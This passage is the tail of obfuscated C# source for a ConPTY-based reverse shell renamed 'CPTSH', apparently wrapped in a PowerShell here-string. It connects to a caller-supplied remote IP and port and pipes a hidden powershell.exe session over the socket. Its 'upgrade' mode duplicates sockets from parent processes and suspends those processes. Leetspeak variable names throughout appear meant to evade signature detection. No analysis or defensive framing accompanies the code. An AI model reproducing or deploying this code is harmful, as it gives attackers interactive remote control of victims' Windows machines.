        IntPtr ${1nputP1p3R34d} = IntPtr.Zero;
        IntPtr ${1nputP1p3Wr1t3} = IntPtr.Zero;
        IntPtr ${0utputP1p3R34d} = IntPtr.Zero;
        IntPtr ${0utputP1p3Wr1t3} = IntPtr.Zero;
        IntPtr ${h4ndl3P53ud0C0ns0l3} = IntPtr.Zero;
        IntPtr ${0ldStd1n} = IntPtr.Zero;
        IntPtr ${0ldStd0ut} = IntPtr.Zero;
        IntPtr ${0ldStd3rr} = IntPtr.Zero;
        bool ${n3wC0ns0l34ll0c4t3d} = false;
        bool ${p4r3ntS0ck3t1nh3r1t3d} = false;
        bool ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = false;
        bool ${c0nptyC0mp4t1bl3} = false;
        bool ${1sS0ck3t0v3rl4pp3d} = true;
        string ${0utput} = "";
        Process ${curr3ntPr0c355} = null;
        Process ${p4r3ntPr0c355} = null;
        Process ${gr4ndP4r3ntPr0c355} = null;
        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
            ${c0nptyC0mp4t1bl3} = true;
        PROCESS_INFORMATION ${ch1ldPr0c3551nf0} = new PROCESS_INFORMATION();
        CreatePipes(ref ${1nputP1p3R34d}, ref ${1nputP1p3Wr1t3}, ref ${0utputP1p3R34d}, ref ${0utputP1p3Wr1t3});
        InitConsole(ref ${0ldStd1n}, ref ${0ldStd0ut}, ref ${0ldStd3rr});
        InitWSAThread();
        if (${c0nptyC0mp4t1bl3})
        {
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
            if (${upgr4d3Sh3ll})
            {
                ${curr3ntPr0c355} = Process.GetCurrentProcess();
                ${p4r3ntPr0c355} = ParentProcessUtilities.GetParentProcess(${curr3ntPr0c355}.Handle);
                if (${p4r3ntPr0c355} != null) ${gr4ndP4r3ntPr0c355} = ParentProcessUtilities.GetParentProcess(${p4r3ntPr0c355}.Handle);
                ${sh3llS0ck3t} = SocketHijacking.DuplicateTargetProcessSocket(${curr3ntPr0c355}, ref ${1sS0ck3t0v3rl4pp3d});
                if (${sh3llS0ck3t} == IntPtr.Zero && ${p4r3ntPr0c355} != null)
                {
                    ${sh3llS0ck3t} = SocketHijacking.DuplicateTargetProcessSocket(${p4r3ntPr0c355}, ref ${1sS0ck3t0v3rl4pp3d});
                    if (${sh3llS0ck3t} == IntPtr.Zero && ${gr4ndP4r3ntPr0c355} != null)
                    {
                        ${sh3llS0ck3t} = SocketHijacking.DuplicateTargetProcessSocket(${gr4ndP4r3ntPr0c355}, ref ${1sS0ck3t0v3rl4pp3d});
                        if (${sh3llS0ck3t} == IntPtr.Zero)
                        {
                            throw new CPTSHException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
                            ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = true;
                        }
                    }
                    else
                    {
                        ${p4r3ntS0ck3t1nh3r1t3d} = true;
                        if (${gr4ndP4r3ntPr0c355} != null) ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = SocketHijacking.IsSocketInherited(${sh3llS0ck3t}, ${gr4ndP4r3ntPr0c355});
                    }
                }
                else
                {
                    if (${p4r3ntPr0c355} != null) ${p4r3ntS0ck3t1nh3r1t3d} = SocketHijacking.IsSocketInherited(${sh3llS0ck3t}, ${p4r3ntPr0c355});
                    if (${gr4ndP4r3ntPr0c355} != null) ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = SocketHijacking.IsSocketInherited(${sh3llS0ck3t}, ${gr4ndP4r3ntPr0c355});
                }
            }
            else
            {
                ${sh3llS0ck3t} = connectRemote(${r3m0t31p}, ${r3m0t3P0rt});
                if (${sh3llS0ck3t} == IntPtr.Zero)
                {
                    ${0utput} += string.Format("{0}Could not connect to ip {1} on port {2}", ${3rr0rStr1ng}, ${r3m0t31p}, ${r3m0t3P0rt}.ToString());
                    return ${0utput};
                }
                TryParseRowsColsFromSocket(${sh3llS0ck3t}, ref ${r0w5}, ref ${c0l5});
            }
            if (GetConsoleWindow() == IntPtr.Zero)
            {
                AllocConsole();
                ShowWindow(GetConsoleWindow(), ${SWH1D3});
                ${n3wC0ns0l34ll0c4t3d} = true;
            }
            int ${p53ud0C0ns0l3Cr34t10nR3sult} = CreatePseudoConsoleWithPipes(ref ${h4ndl3P53ud0C0ns0l3}, ref ${1nputP1p3R34d}, ref ${0utputP1p3Wr1t3}, ${r0w5}, ${c0l5});
            if (${p53ud0C0ns0l3Cr34t10nR3sult} != 0)
            {
                ${0utput} += string.Format("{0}Could not create psuedo console. Error Code {1}", ${3rr0rStr1ng}, ${p53ud0C0ns0l3Cr34t10nR3sult}.ToString());
                return ${0utput};
            }
            ${ch1ldPr0c3551nf0} = CreateChildProcessWithPseudoConsole(${h4ndl3P53ud0C0ns0l3}, ${c0mm4ndL1n3});
        }
        else
        {
            if (${upgr4d3Sh3ll})
            {
                ${0utput} += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
                return ${0utput};
            }
            ${sh3llS0ck3t} = connectRemote(${r3m0t31p}, ${r3m0t3P0rt});
            if (${sh3llS0ck3t} == IntPtr.Zero)
            {
                ${0utput} += string.Format("{0}Could not connect to ip {1} on port {2}", ${3rr0rStr1ng}, ${r3m0t31p}, ${r3m0t3P0rt}.ToString());
                return ${0utput};
            }
            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
            STARTUPINFO ${s1nf0} = new STARTUPINFO();
            ${s1nf0}.cb = Marshal.SizeOf(${s1nf0});
            ${s1nf0}.dwFlags |= (Int32)${ST4RTFUS3STDH4NDL35};
            ${s1nf0}.hStdInput = ${1nputP1p3R34d};
            ${s1nf0}.hStdOutput = ${0utputP1p3Wr1t3};
            ${s1nf0}.hStdError = ${0utputP1p3Wr1t3};
            CreateProcess(null, ${c0mm4ndL1n3}, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref ${s1nf0}, out ${ch1ldPr0c3551nf0});
        }
        if (${1nputP1p3R34d} != IntPtr.Zero) CloseHandle(${1nputP1p3R34d});
        if (${0utputP1p3Wr1t3} != IntPtr.Zero) CloseHandle(${0utputP1p3Wr1t3});
        if (${upgr4d3Sh3ll}) {
            if (${p4r3ntS0ck3t1nh3r1t3d}) NtSuspendProcess(${p4r3ntPr0c355}.Handle);
            if (${gr4ndP4r3ntS0ck3t1nh3r1t3d}) NtSuspendProcess(${gr4ndP4r3ntPr0c355}.Handle);
            if (!${1sS0ck3t0v3rl4pp3d}) SocketHijacking.SetSocketBlockingMode(${sh3llS0ck3t}, 1);
        }
        Thread ${thThr34dR34dP1p3Wr1t3S0ck3t} = StartThreadReadPipeWriteSocket(${0utputP1p3R34d}, ${sh3llS0ck3t}, ${1sS0ck3t0v3rl4pp3d});
        Thread ${thR34dS0ck3tWr1t3P1p3} = StartThreadReadSocketWritePipe(${1nputP1p3Wr1t3}, ${sh3llS0ck3t}, ${ch1ldPr0c3551nf0}.hProcess, ${1sS0ck3t0v3rl4pp3d});
        WaitForSingleObject(${ch1ldPr0c3551nf0}.hProcess, ${1NF1N1T3});
        ${thThr34dR34dP1p3Wr1t3S0ck3t}.Abort();
        ${thR34dS0ck3tWr1t3P1p3}.Abort();
        if (${upgr4d3Sh3ll})
        {
            if (!${1sS0ck3t0v3rl4pp3d})
            {
                WSAEventSelect(${sh3llS0ck3t}, IntPtr.Zero, 0);
                SocketHijacking.SetSocketBlockingMode(${sh3llS0ck3t}, 0);
            }
            if (${p4r3ntS0ck3t1nh3r1t3d}) NtResumeProcess(${p4r3ntPr0c355}.Handle);
            if (${gr4ndP4r3ntS0ck3t1nh3r1t3d}) NtResumeProcess(${gr4ndP4r3ntPr0c355}.Handle);
        }
        closesocket(${sh3llS0ck3t});
        RestoreStdHandles(${0ldStd1n}, ${0ldStd0ut}, ${0ldStd3rr});
        if (${n3wC0ns0l34ll0c4t3d})
            FreeConsole();
        CloseHandle(${ch1ldPr0c3551nf0}.hThread);
        CloseHandle(${ch1ldPr0c3551nf0}.hProcess);
        if (${h4ndl3P53ud0C0ns0l3} != IntPtr.Zero) ClosePseudoConsole(${h4ndl3P53ud0C0ns0l3});
        if (${1nputP1p3Wr1t3} != IntPtr.Zero) CloseHandle(${1nputP1p3Wr1t3});
        if (${0utputP1p3R34d} != IntPtr.Zero) CloseHandle(${0utputP1p3R34d});
        ${0utput} += "CPTSH kindly exited.\r\n";
        return ${0utput};
    }
}

public static class CPTSHMainClass
{
    private static string ${h3lp} = @"Usage: CPTSH <remoteIp> <remotePort> [rows] [cols] [commandLine]
       CPTSH upgrade [rows] [cols] [commandLine]";

    private static bool HelpRequired(string ${p4r4m})
    {
        return ${p4r4m} == "-h" || ${p4r4m} == "--help" || ${p4r4m} == "/?";
    }

    private static void CheckArgs(string[] ${4rgum3nt5})
    {
        if (${4rgum3nt5}.Length < 2)
            throw new CPTSHException("\r\nCPTSH: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }

    private static void DisplayHelp()
    {
        Console.Out.Write(${h3lp});
    }

    private static string CheckRemoteIpArg(string ${1pStr1ng})
    {
        IPAddress ${4ddr355};
        if (!IPAddress.TryParse(${1pStr1ng}, out ${4ddr355}))
            throw new CPTSHException("\r\nCPTSH: Invalid remoteIp value" + ${1pStr1ng});
        return ${1pStr1ng};
    }

    private static int CheckInt(string ${4rg})
    {
        int ${r3t} = 0;
        if (!Int32.TryParse(${4rg}, out ${r3t}))
            throw new CPTSHException("\r\nCPTSH: Invalid integer value " + ${4rg});
        return ${r3t};
    }

    private static uint ParseRows(string[] ${4rgum3nt5})
    {
        uint ${r0w5} = 24;
        if (${4rgum3nt5}.Length > 2)
            ${r0w5} = (uint)CheckInt(${4rgum3nt5}[2]);
        return ${r0w5};
    }

    private static uint ParseCols(string[] ${4rgum3nt5})
    {
        uint ${c0l5} = 80;
        if (${4rgum3nt5}.Length > 3)
            ${c0l5} = (uint)CheckInt(${4rgum3nt5}[3]);
        return ${c0l5};
    }

    private static string ParseCommandLine(string[] ${4rgum3nt5})
    {
        string ${c0mm4ndL1n3} = "powershell.exe";
        if (${4rgum3nt5}.Length > 4)
            ${c0mm4ndL1n3} = ${4rgum3nt5}[4];
        return ${c0mm4ndL1n3};
    }

    public static string CPTSHMain(string[] ${4r95})
    {
        string ${0utput} = "";
        if (${4r95}.Length == 1 && HelpRequired(${4r95}[0]))
        {
            DisplayHelp();
        }
        else
        {
            string ${r3m0t31p} = "";
            int ${r3m0t3P0rt} = 0;
            bool ${upgr4d3Sh3ll} = false;
            try
            {
                CheckArgs(${4r95});
                if (${4r95}[0].Contains("upgrade"))
                    ${upgr4d3Sh3ll} = true;
                else
                {
                    ${r3m0t31p} = CheckRemoteIpArg(${4r95}[0]);
                    ${r3m0t3P0rt} = CheckInt(${4r95}[1]);
                }
                uint ${r0w5} = ParseRows(${4r95});
                uint ${c0l5} = ParseCols(${4r95});
                string ${c0mm4ndL1n3} = ParseCommandLine(${4r95});
                ${0utput} = CPTSH.SpawnCPTSH(${r3m0t31p}, ${r3m0t3P0rt}, ${r0w5}, ${c0l5}, ${c0mm4ndL1n3}, ${upgr4d3Sh3ll});
            }
            catch (Exception ${3})
            {
                Console.WriteLine("\n" + ${3}.ToString() + "\n");
            }
        }
        return ${0utput};
    }
}

class MainClass
{
    static void Main(string[] ${4r95})
    {
        Console.Out.Write(CPTSHMainClass.CPTSHMain(${4r95}));
    }
}
"@;
